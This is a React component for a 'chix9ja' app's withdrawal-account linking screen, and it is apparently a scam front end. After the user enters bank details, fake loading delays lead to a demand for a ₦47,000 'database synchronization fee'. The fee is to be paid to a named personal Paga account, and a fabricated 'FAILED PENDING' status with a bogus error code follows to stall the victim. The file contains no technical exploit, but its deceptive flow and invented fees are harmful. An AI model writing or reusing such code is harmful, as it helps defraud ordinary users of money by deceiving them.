
import React, { useState } from 'react';
import { Icons } from './Icons';
import { User } from '../types';

interface LinkWithdrawAccountProps {
  user: User;
  onBack: () => void;
}

const LinkWithdrawAccount: React.FC<LinkWithdrawAccountProps> = ({ user, onBack }) => {
  const [step, setStep] = useState<'form' | 'notice' | 'instructions' | 'upload' | 'status'>('form');
  const [accountName, setAccountName] = useState('');
  const [bankName, setBankName] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [loading, setLoading] = useState(false);
  const [proofFile, setProofFile] = useState<File | null>(null);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!accountName || !bankName || !accountNumber) {
      alert('Please fill in all fields');
      return;
    }
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep('notice');
    }, 1200);
  };

  const handleUploadProof = () => {
    if (!proofFile) {
      alert('Please select a payment receipt photo');
      return;
    }
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep('status');
    }, 2000);
  };

  if (step === 'status') {
    return (
      <div className="px-4 py-8 space-y-8 animate-in fade-in zoom-in duration-500 pb-24 text-center">
        <div className="flex justify-center">
          <div className="w-24 h-24 bg-red-500/10 rounded-full flex items-center justify-center border-2 border-red-500/50 animate-pulse">
            <Icons.Clock size={48} className="text-red-500" />
          </div>
        </div>

        <div className="space-y-4">
          <h2 className="text-3xl font-black text-white uppercase tracking-tighter leading-tight">
            Integration <span className="text-red-500">Failed Pending</span>
          </h2>
          <div className="bg-red-500/10 border border-red-500/20 p-4 rounded-2xl">
            <p className="text-red-400 text-xs font-bold uppercase tracking-widest">Awaiting Manual Verification</p>
          </div>
          <p className="text-gray-400 text-sm leading-relaxed px-4">
            Your payment proof has been received but the database synchronization status is currently <span className="text-white font-bold">FAILED PENDING</span>. 
          </p>
          <p className="text-xs text-gray-500 italic">
            Please wait 4-12 hours for our network engineers to manually validate your transfer and activate your withdrawal node.
          </p>
        </div>

        <div className="pt-6">
          <button 
            onClick={onBack}
            className="w-full py-5 bg-gray-900 border border-white/10 text-white font-black rounded-2xl active:scale-[0.98] transition-all uppercase tracking-widest text-sm"
          >
            Return to Dashboard
          </button>
        </div>

        <div className="flex items-center justify-center space-x-2 text-[10px] text-gray-600 font-bold uppercase">
          <Icons.ShieldCheck size={14} className="text-red-500" />
          <span>Error Code: SYNC_PEND_403</span>
        </div>
      </div>
    );
  }

  if (step === 'upload') {
    return (
      <div className="px-4 py-8 space-y-8 animate-in fade-in slide-in-from-right-4 duration-500 pb-24">
        <div className="space-y-2 text-center">
          <h2 className="text-2xl font-black text-white uppercase tracking-tight">Upload Proof</h2>
          <p className="text-sm text-gray-400">Please upload a clear screenshot of your bank transfer</p>
        </div>

        <div className="bg-gray-900/50 border-2 border-dashed border-blue-500/30 rounded-[2.5rem] p-10 text-center space-y-4">
           {proofFile ? (
             <div className="space-y-4">
                <div className="mx-auto w-20 h-20 bg-green-500/10 rounded-2xl flex items-center justify-center text-green-500">
                  <Icons.CheckCircle size={40} />
                </div>
                <p className="text-white font-bold text-sm truncate px-4">{proofFile.name}</p>
                <button 
                  onClick={() => setProofFile(null)}
                  className="text-xs text-red-400 font-bold uppercase tracking-widest"
                >
                  Remove & Retry
                </button>
             </div>
           ) : (
             <label className="cursor-pointer block space-y-4">
                <input 
                  type="file" 
                  accept="image/*" 
                  className="hidden" 
                  onChange={(e) => e.target.files && setProofFile(e.target.files[0])}
                />
                <div className="mx-auto w-20 h-20 bg-blue-600/10 rounded-2xl flex items-center justify-center text-blue-400">
                   <Icons.Upload size={32} />
                </div>
                <div>
                  <p className="text-white font-bold">Tap to Upload Receipt</p>
                  <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest mt-1">PNG, JPG or JPEG</p>
                </div>
             </label>
           )}
        </div>

        <div className="space-y-4 pt-4">
          <button 
            disabled={!proofFile || loading}
            onClick={handleUploadProof}
            className={`w-full py-5 rounded-2xl font-black transition-all uppercase tracking-widest text-sm flex items-center justify-center space-x-2 ${proofFile && !loading ? 'bg-blue-600 text-white shadow-xl shadow-blue-600/20 active:scale-[0.98]' : 'bg-gray-800 text-gray-500 cursor-not-allowed'}`}
          >
            {loading ? (
              <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
            ) : (
              <>
                <Icons.CheckCircle size={18} />
                <span>Submit Proof</span>
              </>
            )}
          </button>
          
          <button 
            onClick={() => setStep('instructions')}
            className="w-full py-4 text-gray-500 font-bold uppercase tracking-widest text-xs"
          >
            Go Back
          </button>
        </div>
      </div>
    );
  }

  if (step === 'instructions') {
    return (
      <div className="px-4 py-8 space-y-8 animate-in fade-in slide-in-from-right-4 duration-500 pb-24">
        <div className="space-y-2 text-center">
          <h2 className="text-2xl font-black text-white uppercase tracking-tight">Payment Details</h2>
          <p className="text-sm text-gray-400">Transfer exactly <span className="text-white font-bold text-lg">₦47,000</span> to the details below</p>
        </div>

        <div className="bg-red-600 text-white p-3 rounded-xl text-center font-black text-[10px] uppercase tracking-tighter shadow-lg animate-pulse">
           DONT USE OPAY AND PALMPAY FOR THIS PAYMENT. OTHER BANKS LIKE MONIEPOINT E.T.C ARE ALLOWED.
        </div>

        <div className="bg-gradient-to-br from-gray-900 to-black border border-white/5 rounded-[2.5rem] p-8 space-y-6 shadow-2xl">
           <div className="space-y-1">
              <p className="text-[10px] font-black text-gray-500 uppercase tracking-[0.2em]">Management Bank</p>
              <p className="text-xl font-bold text-white tracking-tight">Paga</p>
           </div>
           
           <div className="space-y-1">
              <p className="text-[10px] font-black text-gray-500 uppercase tracking-[0.2em]">Account Number</p>
              <div className="flex items-center justify-between">
                <p className="text-3xl font-black text-blue-400 tracking-wider">0435119272</p>
                <button 
                  onClick={() => {navigator.clipboard.writeText('0435119272'); alert('Account Number Copied')}}
                  className="p-2 bg-blue-600/10 text-blue-400 rounded-lg active:scale-90 transition-all"
                >
                  <Icons.Copy size={16} />
                </button>
              </div>
           </div>

           <div className="space-y-1">
              <p className="text-[10px] font-black text-gray-500 uppercase tracking-[0.2em]">Account Name</p>
              <p className="text-lg font-bold text-white uppercase">Marvelous Michael O</p>
           </div>
        </div>

        <div className="bg-amber-400/5 border border-amber-400/10 p-4 rounded-2xl flex items-start space-x-3">
           <Icons.AlertTriangle size={20} className="text-amber-400 shrink-0 mt-0.5" />
           <p className="text-[10px] text-gray-400 leading-relaxed italic">
             Important: After transfer, you MUST upload your payment receipt. Failure to upload proof will result in synchronization timeouts.
           </p>
        </div>

        <div className="space-y-4 pt-4">
          <button 
            onClick={() => setStep('upload')}
            className="w-full py-5 bg-blue-600 text-white font-black rounded-2xl shadow-xl shadow-blue-600/20 active:scale-[0.98] transition-all uppercase tracking-widest text-sm flex items-center justify-center space-x-2"
          >
            <span>I Have Made Payment</span>
            <Icons.ArrowRight size={18} />
          </button>
          
          <button 
            onClick={() => setStep('notice')}
            className="w-full py-4 text-gray-500 font-bold uppercase tracking-widest text-xs"
          >
            Go Back
          </button>
        </div>
      </div>
    );
  }

  if (step === 'notice') {
    return (
      <div className="px-4 py-8 space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500 pb-24 text-center">
        <div className="flex justify-center">
          <div className="w-24 h-24 bg-amber-400/10 rounded-full flex items-center justify-center animate-pulse border-2 border-amber-400/50">
            <Icons.AlertTriangle size={48} className="text-amber-400" />
          </div>
        </div>

        <div className="space-y-4">
          <h2 className="text-3xl font-black text-white uppercase tracking-tighter leading-tight">
            Account Linking <span className="text-amber-400">Incomplete</span>
          </h2>
          <p className="text-gray-400 text-sm leading-relaxed px-4">
            Standard verification required. To complete the secure linking of your withdrawal account to the <span className="text-white font-bold italic">chix9ja</span> network, a one-time database synchronization fee is required.
          </p>
        </div>

        <div className="bg-gray-900 border-2 border-amber-400/20 rounded-[2.5rem] p-8 space-y-4 shadow-2xl relative overflow-hidden">
          <div className="absolute top-0 right-0 p-4 opacity-10">
            <Icons.Lock size={120} />
          </div>
          <p className="text-[10px] font-black text-amber-400 uppercase tracking-[0.2em]">Required Payment</p>
          <p className="text-5xl font-black text-white tracking-tighter">₦47,000</p>
          <div className="h-px bg-gray-800 w-1/2 mx-auto"></div>
          <p className="text-xs text-gray-500 font-bold uppercase tracking-widest">Database Sync Fee</p>
        </div>

        <div className="space-y-4">
          <button 
            className="w-full py-5 bg-amber-400 text-black font-black rounded-2xl shadow-xl shadow-amber-400/20 active:scale-[0.98] transition-all uppercase tracking-widest text-sm"
            onClick={() => setStep('instructions')}
          >
            PROCEED TO PAYMENT
          </button>
          
          <button 
            onClick={onBack}
            className="w-full py-4 text-gray-500 font-bold uppercase tracking-widest text-xs hover:text-white transition-colors"
          >
            Cancel & Return
          </button>
        </div>

        <div className="flex items-center justify-center space-x-2 text-[10px] text-gray-600 font-bold uppercase">
          <Icons.ShieldCheck size={14} className="text-amber-400" />
          <span>Secured by chix9ja Node Validator v4.2</span>
        </div>
      </div>
    );
  }

  return (
    <div className="px-4 py-6 space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500 pb-24">
      <div className="flex items-center space-x-2">
        <button onClick={onBack} className="p-2 rounded-full hover:bg-gray-800 transition-colors">
          <Icons.ArrowLeft size={24} className="text-white" />
        </button>
        <h2 className="text-xl font-bold text-white">Link Account</h2>
      </div>

      <div className="text-center space-y-2">
        <div className="mx-auto w-16 h-16 bg-blue-600/10 rounded-2xl flex items-center justify-center text-blue-400 mb-4 border border-blue-600/20">
          <Icons.Link size={32} />
        </div>
        <h3 className="text-2xl font-black text-white uppercase tracking-tight">Withdrawal Account</h3>
        <p className="text-sm text-gray-500 font-medium">Provide details for your external bank account</p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6 bg-gray-900/50 p-6 rounded-[2rem] border border-white/5 backdrop-blur-xl">
        <div className="space-y-4">
          <div className="space-y-1.5">
            <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Account Name</label>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                <Icons.User size={18} className="text-blue-500/50" />
              </div>
              <input 
                type="text"
                value={accountName}
                onChange={(e) => setAccountName(e.target.value)}
                placeholder="Full Name as it appears on bank"
                className="w-full bg-black border border-gray-800 p-4 pl-12 rounded-2xl text-white outline-none focus:border-blue-500 transition-all font-medium text-sm"
              />
            </div>
          </div>

          <div className="space-y-1.5">
            <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Bank Name</label>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                <Icons.Banknote size={18} className="text-blue-500/50" />
              </div>
              <input 
                type="text"
                value={bankName}
                onChange={(e) => setBankName(e.target.value)}
                placeholder="e.g. OPay, PalmPay, Zenit"
                className="w-full bg-black border border-gray-800 p-4 pl-12 rounded-2xl text-white outline-none focus:border-blue-500 transition-all font-medium text-sm"
              />
            </div>
          </div>

          <div className="space-y-1.5">
            <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Account Number</label>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
                <Icons.Hash size={18} className="text-blue-500/50" />
              </div>
              <input 
                type="number"
                value={accountNumber}
                onChange={(e) => setAccountNumber(e.target.value)}
                placeholder="10-digit Account Number"
                className="w-full bg-black border border-gray-800 p-4 pl-12 rounded-2xl text-white outline-none focus:border-blue-500 transition-all font-medium text-sm tracking-widest"
              />
            </div>
          </div>
        </div>

        <button 
          type="submit"
          disabled={loading}
          className="w-full py-5 bg-blue-600 text-white font-black rounded-2xl shadow-xl shadow-blue-600/10 active:scale-[0.98] transition-all flex items-center justify-center space-x-2 uppercase tracking-widest text-sm"
        >
          {loading ? (
            <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
          ) : (
            <>
              <Icons.PlusCircle size={18} />
              <span>Link Account Now</span>
            </>
          )}
        </button>
      </form>

      <div className="bg-blue-600/5 p-4 rounded-xl border border-blue-600/10">
         <p className="text-[10px] text-blue-400 font-bold uppercase tracking-widest mb-1">Security Notice</p>
         <p className="text-xs text-gray-500 leading-relaxed italic">
           Ensure your details are accurate. Linked accounts are cryptographically bound to your chix9ja profile for zero-risk settlements.
         </p>
      </div>
    </div>
  );
};

export default LinkWithdrawAccount;
